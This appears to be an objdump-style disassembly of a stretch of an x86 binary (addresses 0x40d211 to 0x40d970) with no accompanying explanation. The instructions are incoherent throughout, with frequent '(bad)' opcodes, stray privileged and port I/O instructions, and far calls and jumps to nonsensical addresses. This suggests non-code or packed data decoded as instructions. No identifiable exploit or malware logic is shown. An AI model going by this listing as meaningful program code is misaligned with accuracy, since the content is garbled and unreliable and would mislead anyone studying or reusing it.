  40d211:	repnz stos BYTE PTR es:[edi],al
  40d213:	fs inc ecx
  40d215:	push   es
  40d216:	inc    BYTE PTR [eax-0x2ac6e9e8]
  40d21c:	inc    edx
  40d21d:	inc    BYTE PTR [ecx+0x3e0b7ec3]
  40d223:	mov    ecx,0x52830d2c
  40d228:	pop    ss
  40d229:	add    al,0x2c
  40d22b:	mov    eax,0xbc86b21
  40d230:	jge    0x40d1e4
  40d232:	or     ebx,ebx
  40d234:	sbb    BYTE PTR [eax+0x48],cl
  40d237:	call   0x2cf8:0x1e7680da
  40d23e:	aaa    
  40d23f:	mov    bh,0xb8
  40d241:	inc    esp
  40d242:	fs pop ebx
  40d244:	sub    eax,0x735b9896
  40d249:	mov    esi,0xa1139ca6
  40d24e:	ins    DWORD PTR es:[edi],dx
  40d24f:	push   ebx
  40d250:	ror    DWORD PTR cs:[edi],cl
  40d253:	pop    es
  40d254:	inc    ebp
  40d255:	je     0x40d22a
  40d257:	inc    BYTE PTR [edx+0x556e30c4]
  40d25d:	in     eax,dx
  40d25e:	xchg   BYTE PTR [ecx],ah
  40d260:	sti    
  40d261:	bound  ebx,QWORD PTR [edi+0x19]
  40d264:	mov    ebp,0x347ee06d
  40d269:	in     eax,0x22
  40d26b:	fiadd  DWORD PTR [edx-0x6b]
  40d26e:	add    DWORD PTR [ebp+0x5d4df1a9],edx
  40d274:	or     BYTE PTR [edx],ch
  40d276:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d277:	jns    0x40d21f
  40d279:	add    al,0xc9
  40d27b:	mov    dl,0x9a
  40d27d:	(bad)  
  40d27e:	sbb    BYTE PTR [esi+0x6fa1fc1f],bl
  40d284:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d285:	push   eax
  40d286:	or     dh,BYTE PTR [esi+0x41626561]
  40d28c:	adc    al,ch
  40d28e:	out    0xa3,eax
  40d290:	ret    0x349d
  40d293:	adc    eax,0xe0ffe26b
  40d298:	fadd   DWORD PTR [edx]
  40d29a:	out    dx,al
  40d29b:	nop
  40d29c:	inc    eax
  40d29d:	mov    esp,0xbf6fca97
  40d2a2:	add    ebx,eax
  40d2a4:	cli    
  40d2a5:	cmp    eax,DWORD PTR [edi]
  40d2a7:	lahf   
  40d2a8:	retf   
  40d2a9:	add    DWORD PTR [ecx+0x336ef82c],esi
  40d2af:	mov    bh,0x23
  40d2b1:	and    cl,dl
  40d2b3:	mov    dh,BYTE PTR [esi+0x47300fef]
  40d2b9:	xchg   esp,eax
  40d2ba:	push   ds
  40d2bb:	fwait
  40d2bc:	xor    DWORD PTR [edi],ecx
  40d2be:	js     0x40d2b3
  40d2c0:	outs   dx,BYTE PTR ds:[esi]
  40d2c1:	jecxz  0x40d2fe
  40d2c3:	retf   0xe94f
  40d2c6:	or     BYTE PTR [ecx-0x60],ch
  40d2c9:	popa   
  40d2ca:	xchg   esp,eax
  40d2cb:	cdq    
  40d2cc:	js     0x40d2a4
  40d2ce:	mov    bh,0x44
  40d2d0:	ret    0x843a
  40d2d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2d4:	push   eax
  40d2d5:	push   esi
  40d2d6:	jmp    0x40d318
  40d2d8:	std    
  40d2d9:	js     0x40d310
  40d2db:	dec    ebx
  40d2dc:	(bad)  
  40d2dd:	in     eax,0xc4
  40d2df:	add    al,0xa5
  40d2e1:	xchg   esi,esi
  40d2e3:	sahf   
  40d2e4:	adc    al,0x3a
  40d2e6:	sub    DWORD PTR [edi+0x52],0x213a8d24
  40d2ed:	hlt    
  40d2ee:	aas    
  40d2ef:	int    0x4
  40d2f1:	dec    eax
  40d2f2:	jl     0x40d287
  40d2f4:	(bad)  
  40d2f5:	jo     0x40d365
  40d2f7:	mov    esp,0x9b6f8c11
  40d2fc:	cwde   
  40d2fd:	cs push esi
  40d2ff:	push   edi
  40d300:	cwde   
  40d301:	jmp    0x50f2a801
  40d306:	pop    ebx
  40d307:	jp     0x40d2e4
  40d309:	and    DWORD PTR [edx+0x3b2e09e6],0xc49ffc8f
  40d313:	add    al,BYTE PTR [esi+ecx*8]
  40d316:	sbb    eax,0xf9e6e41f
  40d31b:	repz push cs
  40d31d:	clc    
  40d31e:	lahf   
  40d31f:	icebp  
  40d320:	test   BYTE PTR [esi-0x7],0x99
  40d324:	inc    ecx
  40d325:	push   esi
  40d326:	mov    ebx,0xa84091e2
  40d32b:	call   0xf934:0x93f4a972
  40d332:	stos   DWORD PTR es:[edi],eax
  40d333:	cmp    BYTE PTR ss:[edx+0x29987e7d],dh
  40d33a:	xchg   ebx,eax
  40d33b:	call   0x81b2:0x54d32136
  40d342:	imul   edi,ecx,0xffffffd8
  40d345:	neg    DWORD PTR [ebx+0x39]
  40d348:	imul   ebp,esi,0xffffff92
  40d34b:	lods   eax,DWORD PTR ds:[esi]
  40d34c:	ror    BYTE PTR [eax],0xb1
  40d34f:	out    0xfe,al
  40d351:	lods   eax,DWORD PTR ds:[esi]
  40d352:	fdiv   st,st(1)
  40d354:	les    edi,FWORD PTR [ebx+0x51d3cd24]
  40d35a:	fs adc bl,al
  40d35d:	mov    esi,0x798d866
  40d362:	cs test al,0x3c
  40d365:	xor    dl,BYTE PTR [esi+eax*8+0x59]
  40d369:	xchg   ecx,eax
  40d36a:	es jo  0x40d30d
  40d36d:	jge    0x40d31e
  40d36f:	mov    ebx,0x3befd5f7
  40d374:	cmp    ebp,DWORD PTR [ecx]
  40d376:	fimul  DWORD PTR [ebx+0x7b2c2903]
  40d37c:	sahf   
  40d37d:	cmp    al,0x66
  40d37f:	mov    cl,0x92
  40d381:	xchg   edi,eax
  40d382:	push   esp
  40d383:	js     0x40d3f4
  40d385:	adc    al,BYTE PTR [ecx-0xa72e69d]
  40d38b:	pop    ds
  40d38c:	fld    DWORD PTR [ecx+0x2f4c101d]
  40d392:	test   cl,0xa5
  40d395:	fidivr DWORD PTR [edi-0x62]
  40d398:	repz cli 
  40d39a:	iret   
  40d39b:	or     edx,DWORD PTR [ebp-0x3c]
  40d39e:	in     al,0x9c
  40d3a0:	adc    DWORD PTR [esp+edi*4],edx
  40d3a3:	rol    BYTE PTR [eax+0x67a7dca4],0x77
  40d3aa:	cld    
  40d3ab:	aad    0xd4
  40d3ad:	rcr    bh,0x9c
  40d3b0:	test   eax,0xbf400802
  40d3b5:	(bad)  
  40d3b6:	xchg   edi,eax
  40d3b7:	inc    ebp
  40d3b8:	fdiv   DWORD PTR [eax+0x21c34843]
  40d3be:	je     0x40d402
  40d3c0:	jne    0x40d378
  40d3c2:	out    0xf1,eax
  40d3c4:	fcmove st,st(3)
  40d3c6:	mov    ebx,0x80e12000
  40d3cb:	inc    edx
  40d3cc:	mov    ds:0x6adcec87,al
  40d3d1:	push   cs
  40d3d2:	mov    ecx,0xf7be29f8
  40d3d7:	gs mov cl,0x6d
  40d3da:	jbe    0x40d37a
  40d3dc:	ret    0xf71a
  40d3df:	in     al,0x44
  40d3e1:	pop    ebx
  40d3e2:	clc    
  40d3e3:	stos   DWORD PTR es:[edi],eax
  40d3e4:	xor    bh,cl
  40d3e6:	out    dx,eax
  40d3e7:	cmp    dh,BYTE PTR [esi+0x64ba4d4f]
  40d3ed:	pop    ebp
  40d3ee:	mov    eax,0x421e7a74
  40d3f3:	test   eax,0x2cbd5bf5
  40d3f8:	jge    0x40d438
  40d3fa:	adc    DWORD PTR [edx-0x6f136c0e],edx
  40d400:	fnstcw WORD PTR [edi-0x48]
  40d403:	adc    cl,BYTE PTR [edx+ebp*4+0x7a91f3f9]
  40d40a:	xchg   esi,eax
  40d40b:	(bad)
  40d40e:	icebp  
  40d40f:	mov    ebp,0xcbba8e26
  40d414:	mov    dh,0xd6
  40d416:	cmp    al,0x15
  40d418:	mov    eax,ds:0x911d1a7f
  40d41d:	xchg   edi,eax
  40d41e:	fadd   QWORD PTR [esi+0x4e]
  40d421:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d422:	out    dx,eax
  40d423:	popf   
  40d424:	xchg   esp,eax
  40d425:	out    dx,al
  40d426:	mov    eax,0xd45df15b
  40d42b:	mov    eax,ds:0x492d56b7
  40d430:	push   esi
  40d431:	sub    al,0xc7
  40d433:	xchg   ecx,eax
  40d434:	add    eax,0xb10d88e9
  40d439:	into   
  40d43a:	sbb    eax,0xdc7636c3
  40d43f:	cmp    ebx,edi
  40d441:	sbb    DWORD PTR [ecx],esi
  40d443:	mov    edi,esi
  40d445:	fsubr  QWORD PTR [esi-0x4418599c]
  40d44b:	pop    esp
  40d44c:	xchg   ebp,eax
  40d44d:	jne    0x40d414
  40d44f:	addr16 mov edx,0x38f612b2
  40d455:	adc    bh,0xd0
  40d458:	and    ah,BYTE PTR [eax-0x53]
  40d45b:	(bad)  
  40d45d:	dec    edi
  40d45e:	xlat   BYTE PTR ds:[ebx]
  40d45f:	add    BYTE PTR [eax-0x3714b4cd],al
  40d465:	pop    es
  40d466:	mov    dh,0xd9
  40d468:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d469:	adc    BYTE PTR [eax-0x4b375fac],dh
  40d46f:	or     BYTE PTR ds:0x93ed7d94,ch
  40d475:	add    al,0x2a
  40d477:	jg     0x40d48d
  40d479:	test   al,0xf5
  40d47b:	popf   
  40d47c:	shr    ebp,0x2b
  40d47f:	(bad)  
  40d480:	xchg   ecx,eax
  40d481:	mov    esi,0xa015235e
  40d486:	stc    
  40d487:	mov    eax,ds:0x9c315371
  40d48c:	jb     0x40d4e5
  40d48e:	xor    ecx,0xcd17d909
  40d494:	xor    DWORD PTR [ecx+eiz*8],ebp
  40d497:	loopne 0x40d43a
  40d499:	push   0x221aa209
  40d49e:	adc    DWORD PTR [ebp-0xac77b65],edi
  40d4a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4a5:	mov    esi,0x4bae385a
  40d4aa:	cmp    dh,BYTE PTR [edi-0x73c1065a]
  40d4b0:	loopne 0x40d4e0
  40d4b2:	xchg   edi,eax
  40d4b3:	dec    eax
  40d4b4:	adc    ebp,DWORD PTR [ecx+0x14fec9f6]
  40d4ba:	mov    WORD PTR [esi+0x20],es
  40d4bd:	push   es
  40d4be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4bf:	sub    BYTE PTR [edi],ch
  40d4c1:	push   eax
  40d4c2:	xchg   ebx,eax
  40d4c3:	and    DWORD PTR [ecx],ebp
  40d4c5:	(bad)  [edi-0x79a196c8]
  40d4cb:	jae    0x40d52c
  40d4cd:	es dec eax
  40d4cf:	xor    al,0xef
  40d4d1:	jp     0x40d509
  40d4d3:	push   ds
  40d4d4:	dec    edi
  40d4d5:	out    0xa1,al
  40d4d7:	adc    BYTE PTR [esi+eiz*8],al
  40d4da:	(bad)  
  40d4db:	icebp  
  40d4dc:	ins    DWORD PTR es:[edi],dx
  40d4dd:	loopne 0x40d4ad
  40d4df:	adc    edx,DWORD PTR [ebp-0x7c]
  40d4e2:	xor    ebx,DWORD PTR [edi+0x65e1391e]
  40d4e8:	ret    
  40d4e9:	adc    ebx,esi
  40d4eb:	ror    DWORD PTR [ebp+edi*4-0x5955e5bf],cl
  40d4f2:	push   0xffffffb3
  40d4f4:	scas   eax,DWORD PTR es:[edi]
  40d4f5:	add    BYTE PTR [si],ah
  40d4f8:	xchg   edx,eax
  40d4f9:	cmp    al,0x35
  40d4fb:	pop    ebx
  40d4fc:	in     al,dx
  40d4fd:	jge    0x40d51a
  40d4ff:	gs jnp 0x40d57d
  40d502:	push   es
  40d503:	test   DWORD PTR [edx-0xf],ecx
  40d506:	jns    0x40d557
  40d508:	push   cs
  40d509:	das    
  40d50a:	lock inc BYTE PTR [edx+esi*2+0xb81dd6d]
  40d512:	pop    ds
  40d513:	test   eax,0x73d32006
  40d518:	pop    ss
  40d519:	pop    ecx
  40d51a:	loop   0x40d49c
  40d51c:	inc    DWORD PTR [edx+esi*8+0x47]
  40d520:	pop    ss
  40d521:	call   0x8d45:0x15ce1350
  40d528:	loopne 0x40d506
  40d52a:	mov    edi,0x3da1e063
  40d52f:	daa    
  40d530:	lock xchg ebx,eax
  40d532:	into   
  40d533:	xchg   ebx,eax
  40d534:	jo     0x40d568
  40d536:	daa    
  40d537:	xchg   ebx,eax
  40d538:	fsubp  st(0),st
  40d53a:	mov    bh,0x31
  40d53c:	pop    ds
  40d53d:	je     0x40d558
  40d53f:	iret   
  40d540:	xchg   edx,eax
  40d541:	js     0x40d5c0
  40d543:	pop    ebx
  40d544:	shr    DWORD PTR [ecx-0x3af634d0],1
  40d54a:	push   ebx
  40d54b:	xchg   DWORD PTR [eax-0x64b5c3d5],ebp
  40d551:	(bad)  
  40d554:	add    BYTE PTR [esi],dh
  40d556:	cmp    eax,0x4e76c14b
  40d55b:	call   0xa520426a
  40d560:	push   edi
  40d561:	xchg   ebp,ecx
  40d563:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d564:	into   
  40d565:	test   BYTE PTR [edx-0x6e],0xb2
  40d569:	sar    BYTE PTR [ecx-0x5b],0x7
  40d56d:	paddw  mm7,QWORD PTR [edx-0x14]
  40d571:	je     0x40d4fe
  40d573:	adc    BYTE PTR [esi-0x1e303666],0x17
  40d57a:	jmp    0x8ae4dd9c
  40d57f:	loopne 0x40d55f
  40d581:	retf   
  40d582:	and    edi,edi
  40d584:	call   0xa4f3:0xf54b605b
  40d58b:	div    DWORD PTR [edi+0x3097e3f6]
  40d591:	jne    0x40d5b7
  40d593:	loopne 0x40d51b
  40d595:	inc    ebp
  40d596:	(bad)  
  40d597:	ja     0x40d5b2
  40d599:	ja     0x40d57e
  40d59b:	ins    BYTE PTR es:[edi],dx
  40d59c:	sbb    bh,bh
  40d59e:	in     al,dx
  40d59f:	jecxz  0x40d545
  40d5a1:	stos   DWORD PTR es:[edi],eax
  40d5a2:	scas   eax,DWORD PTR es:[edi]
  40d5a3:	mov    bh,0x3d
  40d5a5:	(bad)  
  40d5a6:	mov    cl,0x6d
  40d5a8:	std    
  40d5a9:	dec    ecx
  40d5aa:	fs xchg edx,eax
  40d5ac:	pop    ds
  40d5ad:	jae    0x40d616
  40d5af:	sti    
  40d5b0:	fld    QWORD PTR [edx-0x36ebabef]
  40d5b6:	iret   
  40d5b7:	adc    eax,edx
  40d5b9:	jae    0x40d618
  40d5bb:	sbb    esi,DWORD PTR [edx+0x61048812]
  40d5c1:	jecxz  0x40d5ee
  40d5c3:	jge    0x40d5f4
  40d5c5:	or     eax,DWORD PTR [esi]
  40d5c7:	jmp    DWORD PTR [edi-0x6aae87b]
  40d5cd:	pop    ebx
  40d5ce:	lods   al,BYTE PTR ds:[esi]
  40d5cf:	out    0x20,al
  40d5d1:	je     0x40d622
  40d5d3:	or     esi,DWORD PTR [esp+esi*4]
  40d5d6:	mov    eax,ds:0xacb11a2e
  40d5db:	ficom  DWORD PTR [esi+0x2b06ec60]
  40d5e1:	inc    ecx
  40d5e2:	dec    edi
  40d5e3:	sbb    esi,DWORD PTR [ebx]
  40d5e5:	and    bl,BYTE PTR [esi-0x2d0df325]
  40d5eb:	enter  0x3f13,0x1e
  40d5ef:	int3   
  40d5f0:	cmp    BYTE PTR [ebx-0x1f3304e4],dh
  40d5f6:	(bad)
  40d5fa:	mov    ds:0x6ef49078,eax
  40d5ff:	stos   BYTE PTR es:[edi],al
  40d600:	or     al,0x8b
  40d602:	mov    al,0x1d
  40d604:	ss xchg ebp,eax
  40d606:	sbb    al,0xef
  40d608:	ins    BYTE PTR es:[edi],dx
  40d609:	push   ds
  40d60a:	iret   
  40d60b:	add    eax,0x9bfbba55
  40d610:	add    al,0x5f
  40d612:	push   ebx
  40d613:	imul   eax,DWORD PTR [esi-0x6014bdd2],0x49
  40d61a:	jne    0x40d5c4
  40d61c:	outs   dx,DWORD PTR ds:[esi]
  40d61d:	push   eax
  40d61e:	sub    edx,edi
  40d620:	or     ch,BYTE PTR [ebx+0x28861e44]
  40d626:	cs hlt 
  40d628:	wrmsr  
  40d62a:	pop    es
  40d62b:	push   esp
  40d62c:	imul   eax,DWORD PTR [ecx+0x6e],0xffffffcb
  40d630:	adc    bl,0xb2
  40d633:	dec    esi
  40d634:	fist   WORD PTR [ebx]
  40d636:	push   edx
  40d637:	or     dh,bh
  40d639:	cmp    al,dh
  40d63b:	lods   al,BYTE PTR ds:[esi]
  40d63c:	push   edx
  40d63d:	ret    
  40d63e:	in     eax,0x68
  40d640:	sbb    eax,0x9c2ebdd1
  40d645:	mov    cl,0x97
  40d647:	ja     0x40d60d
  40d649:	dec    ecx
  40d64a:	ins    DWORD PTR es:[edi],dx
  40d64b:	test   al,0x0
  40d64d:	push   0xffffff97
  40d64f:	mov    ds:0xf1191838,eax
  40d654:	jne    0x40d685
  40d656:	xchg   edx,eax
  40d657:	jne    0x40d693
  40d659:	jle    0x40d6d1
  40d65b:	push   es
  40d65c:	les    edi,FWORD PTR [ebx]
  40d65e:	push   esi
  40d65f:	icebp  
  40d660:	mov    dl,0xb8
  40d662:	lahf   
  40d663:	pop    ebp
  40d664:	std    
  40d665:	xchg   edi,eax
  40d666:	mov    ecx,0xac27326e
  40d66b:	xchg   esi,eax
  40d66c:	shr    DWORD PTR [eax+0x27731512],cl
  40d672:	sbb    esi,DWORD PTR [edx]
  40d674:	cmp    eax,0xedc30710
  40d679:	test   BYTE PTR [edi],ah
  40d67b:	inc    ebp
  40d67c:	retf   
  40d67d:	push   ds
  40d67e:	(bad)  
  40d67f:	add    dl,bh
  40d681:	adc    eax,0x8a9b6c76
  40d686:	add    al,0xdc
  40d688:	cs pop ebx
  40d68a:	gs mov bh,0xff
  40d68d:	xor    BYTE PTR [ebx],al
  40d68f:	mov    bl,0xfe
  40d691:	(bad)  
  40d692:	push   edi
  40d693:	cmp    eax,0xc9c47439
  40d698:	shl    DWORD PTR [ebx+0x3d],cl
  40d69b:	inc    esp
  40d69c:	fisub  DWORD PTR [eax-0x18]
  40d69f:	sub    BYTE PTR [ecx+0x4e2ad677],cl
  40d6a5:	rcl    BYTE PTR [edx],1
  40d6a7:	xchg   edx,eax
  40d6a8:	test   bh,al
  40d6aa:	(bad)  
  40d6ab:	mov    edi,0x44461c
  40d6b0:	(bad)  
  40d6b1:	adc    DWORD PTR [edi],edi
  40d6b3:	addr16 ret 
  40d6b5:	mov    al,0x97
  40d6b7:	pop    DWORD PTR ds:0xa9d0038
  40d6bd:	mov    ds:0x850854b7,al
  40d6c2:	dec    ebp
  40d6c3:	imul   ebp,ecx,0x44
  40d6c6:	(bad)  
  40d6c7:	loop   0x40d6cc
  40d6c9:	fwait
  40d6ca:	sub    BYTE PTR [ebx-0x27],bl
  40d6cd:	es in  al,dx
  40d6cf:	sub    al,0x1a
  40d6d1:	dec    ecx
  40d6d2:	mov    cl,0x65
  40d6d4:	out    dx,al
  40d6d5:	addr16 je 0x40d6f9
  40d6d8:	jnp    0x40d6ad
  40d6da:	xchg   esp,eax
  40d6db:	ins    BYTE PTR es:[edi],dx
  40d6dc:	xchg   edi,eax
  40d6dd:	in     eax,dx
  40d6de:	iret   
  40d6df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6e0:	(bad)  
  40d6e1:	xchg   ecx,eax
  40d6e2:	daa    
  40d6e3:	es fs lahf 
  40d6e6:	aas    
  40d6e7:	shl    eax,1
  40d6e9:	inc    edi
  40d6ea:	xchg   edi,eax
  40d6eb:	in     al,0x62
  40d6ed:	into   
  40d6ee:	hlt    
  40d6ef:	in     al,0x16
  40d6f1:	adc    ebx,ebx
  40d6f3:	ins    BYTE PTR es:[edi],dx
  40d6f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6f5:	mov    ebx,0xa5e12c98
  40d6fa:	repnz xchg cl,dl
  40d6fd:	retf   0x84af
  40d700:	outs   dx,BYTE PTR ds:[esi]
  40d701:	xchg   ecx,eax
  40d702:	inc    ebp
  40d703:	cs jns 0x40d6a8
  40d706:	add    al,0x25
  40d708:	jge    0x40d72a
  40d70a:	mov    dl,BYTE PTR [esi-0xf72609d]
  40d710:	push   ecx
  40d711:	mov    BYTE PTR [eax-0x20],dl
  40d714:	inc    ecx
  40d715:	in     eax,0xc6
  40d717:	pop    es
  40d718:	dec    edi
  40d719:	add    al,0x9b
  40d71b:	xchg   ebp,eax
  40d71c:	dec    edx
  40d71d:	leave  
  40d71e:	std    
  40d71f:	cdq    
  40d720:	add    ecx,esp
  40d722:	push   edi
  40d723:	fsub   DWORD PTR [edx]
  40d725:	push   ds
  40d726:	test   DWORD PTR [edi-0x12badc9],edx
  40d72c:	xor    DWORD PTR [edx+0x20bd39d5],esp
  40d732:	xor    DWORD PTR [esi+0x42],edi
  40d735:	test   DWORD PTR [ebp+0x6cb11ce3],0xae979a57
  40d73f:	std    
  40d740:	xchg   ecx,eax
  40d741:	retf   
  40d742:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d743:	add    eax,0x86d5bf60
  40d748:	add    BYTE PTR [ecx-0x409dd6d2],0xb3
  40d74f:	loopne 0x40d6fc
  40d751:	int3   
  40d752:	loopne 0x40d779
  40d754:	dec    esp
  40d755:	aad    0x9c
  40d757:	sbb    eax,0xcf31c248
  40d75c:	adc    dl,BYTE PTR [edx+0x12d01e8f]
  40d762:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d763:	push   ebx
  40d764:	popa   
  40d765:	(bad)  
  40d766:	das    
  40d767:	cwde   
  40d768:	pxor   mm0,mm7
  40d76b:	xor    DWORD PTR cs:[ebp-0x12],edx
  40d76f:	(bad)  
  40d770:	scas   al,BYTE PTR es:[edi]
  40d771:	es xchg ebp,eax
  40d773:	fcomp  DWORD PTR [eax-0x72]
  40d776:	in     eax,0xcb
  40d778:	push   ebp
  40d779:	add    al,0xd3
  40d77b:	and    BYTE PTR [edx+edi*4],al
  40d77e:	xlat   BYTE PTR ds:[ebx]
  40d77f:	cmp    eax,DWORD PTR [edx+eiz*4-0x1a]
  40d783:	shl    BYTE PTR [esi+0x5618dd21],1
  40d789:	jne    0x40d770
  40d78b:	daa    
  40d78c:	repz or eax,0x126cb80
  40d792:	mov    ah,bh
  40d794:	cmp    al,BYTE PTR [ebp+0x11a43c1d]
  40d79a:	cli    
  40d79b:	fsubr  QWORD PTR [ecx]
  40d79d:	popf   
  40d79e:	mov    edx,0xed9c834c
  40d7a3:	mov    ah,0x81
  40d7a5:	fsubr  QWORD PTR [ebx-0x25258b5a]
  40d7ab:	pop    edx
  40d7ac:	stos   BYTE PTR es:[edi],al
  40d7ad:	sub    bl,0xa0
  40d7b0:	sahf   
  40d7b1:	or     DWORD PTR [ebp+0x61],ebx
  40d7b4:	stc    
  40d7b5:	sbb    DWORD PTR [edx],0x8c87309f
  40d7bb:	inc    edi
  40d7bc:	jae    0x40d74e
  40d7be:	cli    
  40d7bf:	fstp   st(0)
  40d7c1:	in     eax,dx
  40d7c2:	xor    dl,ch
  40d7c4:	inc    ecx
  40d7c5:	pop    ss
  40d7c6:	cli    
  40d7c7:	inc    ebx
  40d7c8:	cs retf 
  40d7ca:	ret    0xd60e
  40d7cd:	div    BYTE PTR [ebp+0x6]
  40d7d0:	pop    esp
  40d7d1:	std    
  40d7d2:	scas   al,BYTE PTR es:[edi]
  40d7d3:	addr16 jle 0x40d7b6
  40d7d6:	xor    DWORD PTR [esi+ecx*8-0x1470bc83],esi
  40d7dd:	leave  
  40d7de:	xchg   edx,eax
  40d7df:	add    DWORD PTR [edi+ecx*2-0x7ca848c7],ebp
  40d7e6:	(bad)  
  40d7e7:	mov    gs,ecx
  40d7e9:	jmp    0x40d786
  40d7eb:	(bad)  
  40d7ec:	mov    esp,0xb635d26b
  40d7f1:	jno    0x40d780
  40d7f3:	fcmovnu st,st(3)
  40d7f5:	sbb    dh,bh
  40d7f7:	fistp  DWORD PTR [esi-0x62c5a477]
  40d7fd:	int3   
  40d7fe:	jmp    0x92c159f9
  40d803:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d804:	ss loopne 0x40d854
  40d807:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d808:	aas    
  40d809:	mov    WORD PTR [eax+0x4c],gs
  40d80c:	fsub   DWORD PTR [edx+0x24]
  40d80f:	or     ah,cl
  40d811:	bound  edi,QWORD PTR [eax+0x3b]
  40d814:	lea    eax,[ecx]
  40d816:	inc    esi
  40d817:	push   edi
  40d818:	popf   
  40d819:	sbb    cl,BYTE PTR [ecx]
  40d81b:	mov    esp,0x55b5a23
  40d820:	bound  eax,QWORD PTR [ecx]
  40d822:	in     eax,dx
  40d823:	fcomp  DWORD PTR [esp+ebx*1+0x480aa2ae]
  40d82a:	mov    esp,0x7d482a34
  40d82f:	mov    al,ds:0x7d6be055
  40d834:	push   ss
  40d835:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d836:	nop
  40d837:	push   es
  40d838:	jae    0x40d81e
  40d83a:	repnz xchg edi,eax
  40d83c:	arpl   WORD PTR [ecx+ebx*4+0x73b6f123],si
  40d843:	xchg   esi,eax
  40d844:	leave  
  40d845:	mul    dh
  40d847:	retf   
  40d848:	xor    ebp,DWORD PTR [esi+0x2f]
  40d84b:	mov    edx,0x6ca2b48a
  40d850:	int3   
  40d851:	mov    cl,0x2e
  40d853:	push   cs
  40d854:	out    0x98,al
  40d856:	retf   0xcf93
  40d859:	sbb    ah,bh
  40d85b:	cwde   
  40d85c:	pop    eax
  40d85d:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40d85f:	mov    DWORD PTR cs:[esi],ecx
  40d862:	push   esi
  40d863:	ret    0xd5ad
  40d866:	jne    0x40d8b0
  40d868:	pop    ecx
  40d869:	(bad)  
  40d86a:	div    DWORD PTR [esi-0x63ba293]
  40d870:	pop    ebp
  40d871:	mov    edi,0xdb0b42c6
  40d876:	in     al,dx
  40d877:	out    dx,al
  40d878:	daa    
  40d879:	mov    ds:0xffea66ca,eax
  40d87e:	adc    DWORD PTR [ebx-0x1643b418],ebx
  40d884:	fdivr  st,st(7)
  40d886:	xor    eax,0xa9330e24
  40d88b:	stc    
  40d88c:	(bad)  
  40d88d:	je     0x40d82a
  40d88f:	dec    ecx
  40d890:	or     ah,0x9c
  40d893:	mov    bl,0x6d
  40d895:	lds    esp,FWORD PTR [ebp-0x51170871]
  40d89b:	shr    DWORD PTR [edx+esi*4+0x130718f6],cl
  40d8a2:	push   cs
  40d8a3:	in     eax,dx
  40d8a4:	test   al,0x60
  40d8a6:	in     eax,0x76
  40d8a8:	arpl   bx,ax
  40d8aa:	ins    BYTE PTR es:[edi],dx
  40d8ab:	mov    esi,0x1538ae04
  40d8b0:	cmp    dh,BYTE PTR [ecx-0x3af5870a]
  40d8b6:	in     al,0x2f
  40d8b8:	xchg   ecx,eax
  40d8b9:	add    ah,ah
  40d8bb:	push   edi
  40d8bc:	add    bh,al
  40d8be:	jno    0x40d89c
  40d8c0:	jne    0x40d87a
  40d8c2:	ins    BYTE PTR es:[edi],dx
  40d8c3:	xor    edi,DWORD PTR [eax-0x7d]
  40d8c6:	xor    al,0xae
  40d8c8:	jae    0x40d901
  40d8ca:	shl    DWORD PTR [edi+0x61402e8],1
  40d8d0:	je     0x40d8a2
  40d8d2:	sub    DWORD PTR [edx-0x68],edx
  40d8d5:	stos   BYTE PTR es:[edi],al
  40d8d6:	fld    QWORD PTR [ebp-0x7a33b8ff]
  40d8dc:	sub    al,0xab
  40d8de:	sbb    DWORD PTR [ebx+0x2],eax
  40d8e1:	lock xor cl,0xdf
  40d8e5:	jo     0x40d8e9
  40d8e7:	pushf  
  40d8e8:	lds    ebx,FWORD PTR [ebx+0x3f]
  40d8eb:	inc    ebx
  40d8ec:	sub    eax,0xa11aec17
  40d8f1:	jbe    0x40d8ab
  40d8f3:	dec    ebx
  40d8f4:	mov    edi,0x68acb302
  40d8f9:	pop    ebp
  40d8fa:	fucomp st(2)
  40d8fc:	cs push ebp
  40d8fe:	sar    DWORD PTR [edx],cl
  40d900:	sahf   
  40d901:	and    edi,DWORD PTR ds:0x68ef8bfb
  40d907:	sbb    DWORD PTR [edx],esi
  40d909:	adc    DWORD PTR [esi*2-0x221cc154],ebx
  40d910:	loopne 0x40d985
  40d912:	pop    ebx
  40d913:	jns    0x40d8be
  40d915:	arpl   WORD PTR [ebx],ax
  40d917:	into   
  40d918:	push   ds
  40d919:	pop    ss
  40d91a:	lds    ecx,FWORD PTR [eax+0x4a9f9bf7]
  40d920:	jmp    0xa5f3:0x88f49e91
  40d927:	outs   dx,BYTE PTR ds:[esi]
  40d928:	aam    0x96
  40d92a:	(bad)  
  40d92b:	in     eax,0x88
  40d92d:	adc    BYTE PTR [ebp-0x77],0x67
  40d931:	sub    edi,DWORD PTR [edx+0x51]
  40d934:	cmc    
  40d935:	rdpmc  
  40d937:	cmp    eax,0xa6c93a32
  40d93c:	sbb    eax,0xa5270ef0
  40d941:	fmul   DWORD PTR [ecx+ebx*8-0x7f]
  40d945:	sub    eax,0xc95abc8a
  40d94a:	dec    esi
  40d94b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d94c:	jg     0x40d9aa
  40d94e:	xor    al,0xf3
  40d950:	fdiv   DWORD PTR [edx-0x374fcf31]
  40d956:	jecxz  0x40d986
  40d958:	jge    0x40d9ca
  40d95a:	sub    al,0xd1
  40d95c:	xchg   esp,eax
  40d95d:	hlt    
  40d95e:	icebp  
  40d95f:	mov    esp,0xcf5a3e78
  40d964:	jp     0x40d98c
  40d966:	and    al,0x8c
  40d968:	sbb    eax,0xeeffcd5b
  40d96d:	jno    0x40d985
  40d96f:	(bad)  
  40d970:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
